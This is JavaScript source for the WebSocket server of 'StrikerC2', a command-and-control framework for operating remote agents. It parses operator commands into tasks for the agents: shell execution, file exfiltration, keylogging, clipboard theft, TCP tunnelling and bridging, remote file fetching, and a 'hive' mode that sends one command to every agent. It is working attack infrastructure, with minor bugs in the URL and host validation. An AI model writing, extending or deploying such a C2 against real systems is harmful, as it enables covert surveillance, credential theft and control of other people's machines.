/**
 * @file The server side Web Sockets (WS) implementation.
 *       This file also handles logic of agents console.
 * @author Umar Abdul
 */

import {Server} from 'socket.io';
import User, * as userModel from '../models/user.js';
import Key, * as keyModel from '../models/key.js';
import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';
import File, * as fileModel from '../models/file.js';
import Chat, * as chatModel from '../models/chat.js';
import {logStatus, logWarning, logError} from '../models/log.js';
import {output} from './utils.js';

/**
 * Configure the web socket server and create event listeners.
 * @param {object} httpServer - The HTTP server object returned by Express.
 */
export const setupWS = (httpServer) => {

  // Create the socket server and make it global (we will be needing it in other files).
  global.socketServer = new Server(httpServer, {
    cors: {
      origin: global.ORIGIN_URL,
      methods: ["GET", "POST"]
    }
  });

  global.socketObjects = {}; // Maps usernames to connected socket objects.
  global.adminSocketObjects = {}; // For admin users only.
  global.serverPrompt = "StrikerC2"; // The console prompt to use for server output.
  const users = {}; // Maps connected socket IDs to usernames.

  /**
   * Emit a WS event to all admin users.
   * @param {string} name - The event name.
   * @param {object} data - The event data.
   */
  global.adminWSEmit = async (name, data) => {

    for (let username in adminSocketObjects)
      adminSocketObjects[username].emit(name, data);
  };

  // Define an auth middleware.
  socketServer.use((socket, next) => {

    const token = socket.handshake.auth.token;
    if (!token)
      return next(new Error("Access denied!"));
    // Authenticate.
    userModel.getUserByToken(token).then(user => {
      users[socket.id] = user.username;
      next();
    }).catch(error => {
      return next(new Error("Access denied!"));
    });
  });

  // Handle connections.
  socketServer.on('connection', async (client) => {

    const serverPrompt = global.serverPrompt;
    const username = users[client.id];
    const user = await User.findOne({username});
    if (user.admin)
      adminSocketObjects[username] = client;
    socketObjects[username] = client;
    output(`WS: New connection for '${username}': ${client.id}`);

    // For building help page. Following commands are supported by all agents.
    const helpData = {
      "abort": "Task agent to quit",
      "clear": "Clear console output",
      "cd <dir>": "Change working directory",
      "delay <secs>": "Update agent callback delay",
      "delete agent <id>": "Delete an agent",
      "delete task <id>": "Delete a task",
      "download <file>": "Download a file from agent",
      "freeze": "Freeze the agent (don't send tasks)",
      "unfreeze": "Unfreeze the agent",
      "help/?": "You are looking at it :)",
      "hive <cmd>": "Task all agents with the given command",
      "kill <id>": "Kill a running task",
      "tasks": "List running tasks",
      "tunnel <lhost>:<lport> <rhost>:<rport>": "Start a TCP tunnel",
      "bridge <host1>:<port1> <host2>:<port2>": "Start a TCP bridge b/w 2 servers",
      "system <cmd>": "Run a shell command",
      "writedir <dir>": "Change agent's write directory",
      "webload <url> <file>": "Download a file from a URL"
    }

    /**
     * For processing raw agent console inputs from users. 
     * Note that some inputs are handled completely in the client side.
     * Both input and results are broadcasted to all connected users.
     */
    client.on("agent_console_input", async (data) => {

      try{
        let input = data.input.toString().trim();
        let agents = [];
        let hiveMode = false;
        if (input.startsWith("hive ")){
          input = input.substr(5).trim();
          agents = await agentModel.getAgents();
          client.emit("agent_console_output", {
            agentID: data.agent.uid, prompt: serverPrompt, msg: `${agents.length} agents selected (hive mode) for command: ${input}`
          });
          hiveMode = true;
        }else{
          agents.push(data.agent);
        }
        for (let i = 0; i < agents.length; i++){
          const agent = agents[i];
          const agentID = agent.uid;
          if (!hiveMode){
            client.emit("agent_console_output", {
              agentID, prompt: username, msg: input
            });            
          }
          if (input === "help" || input === "?"){
            const agentHelp = {...helpData};
            if (agent.agentType === 0){ // The main C agent
              agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
              agentHelp["clipread"] = "Get text from clipboard";
              agentHelp["clipwrite <text>"] =  "Write text to clipboard";
            }
            let cmds = Object.keys(agentHelp).sort();
            let maxLen = 0;
            for (let cmd of cmds){
              if (cmd.length > maxLen)
                maxLen = cmd.length;
            }
            let helpPage = `  ${"COMMAND".padEnd(maxLen, " ")}  ${"FUNCTION"}\n`;
            helpPage += `  ${"".padEnd(maxLen, "-")}  ${"--------------------"}\n`;
            for (let cmd of cmds)
              helpPage += `  ${cmd.padEnd(maxLen, " ")}  ${agentHelp[cmd]}\n`
            client.emit("agent_console_output", {
              agentID, msg: helpPage
            });
          }else if (input.startsWith("system ")){ // Create a system command task
            let cmd = input.substr(7).trim();
            const taskData = {agentID, taskType: "system", data: {cmd}};
            taskModel.createTask(username, taskData);
          }else if (input === "freeze"){ // Freeze an agent.
            agentModel.freezeAgent(agentID, username);
          }else if (input === "unfreeze"){ // Unfreeze an agent.
            agentModel.unfreezeAgent(agentID, username);
          }else if (input.startsWith("delete task ")){ // Delete a task.
            let taskID = input.substr(12).trim();
            taskModel.deleteTask(agentID, taskID, username);
          }else if (input === "delete agent"){ // Delete the agent.
            agentModel.deleteAgent(agentID, username).then(async () => {
              await taskModel.deleteAllTasks(agentID);
              await fileModel.deleteAllFiles(agentID);
            });
          }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
            let filename = input.substr(9).trim();
            taskModel.createTask(username, {
              agentID, taskType: "download", data: {file: filename}
            });
          }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
            let dir = input.substr(9).trim();
            taskModel.createTask(username, {
              agentID, taskType: "writedir", data: {dir}
            });
          }else if (input.startsWith("keymon ")){ // Start a keylogger.
            let duration = parseInt(input.substr(7).trim());
            taskModel.createTask(username, {
              agentID, taskType: "keymon", data: {duration}
            });
          }else if (input.startsWith("delay ")){
            let delay = input.substr(6).trim();
            if (isNaN(delay)){
              client.emit("agent_console_output", {
                agentID,
                prompt: serverPrompt,
                msg: "Invalid callback delay: " + delay
              });
            }else{
              delay = parseInt(delay);
              const onComplete = async (agent, task) => {
                if (task.successful)
                  agent.delay = task.data.delay;
              };
              taskModel.createTask(username, {
                agentID, taskType: "delay", data: {delay}
              }, onComplete);
            }
          }else if (input.startsWith("cd ")){
            let dirname = input.substr(3).trim();
            const onComplete = async (agent, task) => {
              if (task.successful)
                agent.cwd = task.data.dir;
            };
            taskModel.createTask(username, {
              agentID, taskType: "cd", data: {dir: dirname}
            }, onComplete);
          }else if (input.startsWith("tunnel ")){
            let addrs = input.substr(7).trim();
            let lhost = addrs.split(":")[0].trim()
            let lport = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
            let rhost = addrs.split(" ")[1].trim().split(":")[0].trim();
            let rport = parseInt(addrs.split(":")[2].trim())
            if (isNaN(lport) || isNaN(rport))
              return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
            if (!(lhost && rhost))
              return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
            taskModel.createTask(username, {
              agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
            });
          }else if (input.startsWith("bridge ")){
            let addrs = input.substr(7).trim();
            let host1 = addrs.split(":")[0].trim()
            let port1 = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
            let host2 = addrs.split(" ")[1].trim().split(":")[0].trim();
            let port2 = parseInt(addrs.split(":")[2].trim())
            if (isNaN(port1) || isNaN(port2))
              return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
            if (!(host1 && port1))
              return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
            taskModel.createTask(username, {
              agentID, taskType: "bridge", data: {host1, port1, host2, port2}
            });
          }else if (input === "tasks"){
            let tasks = await taskModel.getTasks(agentID);
            let running = [];
            for (let task of tasks){
              if (task.received === true && task.completed === false)
                running.push(task);
            }
            let msg = "No running tasks at the moment!";
            if (running.length > 0){
              msg = "";
              for (let task of running)
                msg += ` > ${task.uid} - ${task.taskType}\n`;
            }
            return client.emit("agent_console_output", {agentID, msg});
          }else if (input.startsWith("kill ")){
            const task = await Task.findOne({uid: input.substr(5).trim()});
            if (!task)
              return client.emit("agent_console_output", {agentID, msg: "Invalid task!"});
            if (!(task.completed === false && task.received === true))
              return client.emit("agent_console_output", {agentID, msg: "Task already completed, or not yet received by agent!"});
            taskModel.createTask(username, {
              agentID, taskType: "kill", data: {uid: task.uid}
            });
          }else if (input.startsWith("webload ")){
            let url = input.split(" ")[1].trim();
            let file = input.split(" ")[2].trim();
            if (!(url.startsWith("http://") || url.startsWith("http://"))){
              client.emit("agent_console_output", {agentID, msg: "Only HTTP(s) URLs are supported!"});
            }else{
              taskModel.createTask(username, {
                agentID, taskType: "webload", data: {url, file}
              });
            }
          }else if (input === "clipread"){
            taskModel.createTask(username, {
              agentID, taskType: "clipread"
            });
          }else if (input.startsWith("clipwrite ")){
            let text = input.substr(10)
            taskModel.createTask(username, {
              agentID, taskType: "clipwrite", data: {text}
            });
          }else if (input === "abort"){
            taskModel.createTask(username, {
              agentID, taskType: "abort"
            });
          }else{ // Unknown query
            client.emit("agent_console_output", {
              agentID,
              prompt: serverPrompt,
              msg: "Unknown command: " + input
            });
          }
        }
      }catch(error){
        client.emit("striker_error", error.message);
      }
    });

    // For queuing a prepared task for an agent.
    client.on("create_task", (data) => {
       taskModel.createTask(username, data).catch(error => {
        client.emit("striker_error", error.message);
      });
    });

    // For creating a new team chat message.
    client.on("send_teamchat_message", (message) => {

      if (!message)
        return;
      message = message.toString().trim();
      if (message === "/users"){
        let users = Object.keys(socketObjects).sort();
        let output = "";
        for (let user of users)
          output += `=>  ${user}\n`;
        client.emit("new_teamchat_message", {message: output.trim()});
      }else{
        chatModel.createMessage(username, message).catch(error => {
        });
      }
    });

    // Handles client ws disconnect
    client.on("disconnect", () => {

      delete global.socketObjects[username];
      if (global.adminSocketObjects[username])
        delete global.adminSocketObjects[username];
      socketServer.emit("new_teamchat_message", {message: `***** User '${username}' has logged out! *****`});
      output(`WS: User '${username}' has disconnect!`);
    });

  });

};
